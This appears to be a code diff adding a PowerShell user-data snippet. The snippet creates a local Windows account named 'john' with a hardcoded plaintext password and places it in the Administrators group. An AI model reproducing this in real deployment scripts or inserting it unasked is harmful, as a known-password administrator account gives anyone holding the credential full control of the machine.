@@ -1,0 +1,4 @@
+<powershell>
+net user john 'Wh@tEverS1cr1t' /add
+net localgroup Administrators john /add
+</powershell>
